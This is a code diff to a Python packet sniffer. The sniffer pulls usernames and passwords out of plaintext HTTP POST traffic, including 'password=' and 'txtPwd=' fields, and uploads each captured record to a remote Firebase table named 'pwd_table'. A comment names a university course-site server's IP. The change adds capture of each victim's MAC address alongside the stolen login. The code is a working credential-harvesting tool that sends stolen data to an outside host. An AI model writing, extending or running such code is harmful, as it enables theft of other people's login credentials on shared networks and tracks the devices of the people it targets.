@@ -3,9 +3,11 @@ import pcap
 import re
 import socket
 import urlparse
+import binascii
 from firebase import firebase
 from pprint import pprint
 import settings
+from utils import add_colons_to_mac
 
 APP_TO_PORT = {80: 'http'}
 
@@ -39,11 +41,14 @@ class Sniffer(object):
         regex = re.compile('(.*)[txtPwd]=(.*)')
         return content is not None and regex.search(content)
 
-    def _pick_info(self, data, client, server, app):
+    def _pick_info(self, data, client, server, app, eth_src):
         self.info_counter += 1
-        self.all_user_info[self.info_counter] = {'client': client,
-                                                 'server': server,
-                                                 'app': APP_TO_PORT.get(app)}
+        self.all_user_info[self.info_counter] = (
+            {'client': client, 'server': server,
+             'app': APP_TO_PORT.get(app),
+             'mac': add_colons_to_mac(binascii.hexlify(eth_src))}
+        )
+
         if data.get('account'):
             self.all_user_info[self.info_counter].update(
                 {'login': data.get('account')[0]})
@@ -81,7 +86,7 @@ class Sniffer(object):
         pprint(self.all_user_info[self.info_counter])
         self._firebase.post('/pwd_table', self.all_user_info[self.info_counter])
 
-    def _get_http_payload(self, ip_pkt, tcp_pkt):
+    def _get_http_payload(self, eth_pkt, ip_pkt, tcp_pkt):
         try:
             http_req = dpkt.http.Request(tcp_pkt.data)
             if http_req.method == 'POST':
@@ -101,7 +106,7 @@ class Sniffer(object):
                     # print qs_d
                     self._pick_info(qs_d, socket.inet_ntoa(ip_pkt.src),
                                     socket.inet_ntoa(ip_pkt.dst),
-                                    tcp_pkt.dport)
+                                    tcp_pkt.dport, eth_pkt.src)
 
         elif 'password=' in tcp_pkt.data:
             # print 'password', tcp.data
@@ -109,13 +114,13 @@ class Sniffer(object):
             # print qs_d
             self._pick_info(qs_d, socket.inet_ntoa(ip_pkt.src),
                             socket.inet_ntoa(ip_pkt.dst),
-                            tcp_pkt.dport)
+                            tcp_pkt.dport, eth_pkt.src)
 
         elif 'txtPwd=' in tcp_pkt.data:
             qs_d = urlparse.parse_qs(tcp_pkt.data)
             self._pick_info(qs_d, socket.inet_ntoa(ip_pkt.src),
                             socket.inet_ntoa(ip_pkt.dst),
-                            tcp_pkt.dport)
+                            tcp_pkt.dport, eth_pkt.src)
         else:
             return
         # Moocs dst IP 140.114.60.144
@@ -130,14 +135,14 @@ class Sniffer(object):
                     ip = eth.data
                     tcp = ip.data
                     if len(tcp.data) > 0:
-                        self._get_http_payload(ip, tcp)
+                        self._get_http_payload(eth, ip, tcp)
 
             except KeyboardInterrupt:
                 nrecv, ndrop, nifdrop = self.pc.stats()
                 print '\n%d packets received by filter' % nrecv
                 print '%d packets dropped by kernel' % ndrop
-                print 'All user info: '
-                pprint(self.all_user_info)
+                # print 'All user info: '
+                # pprint(self.all_user_info)
                 break
             except (NameError, TypeError):
                 # print "No packet"
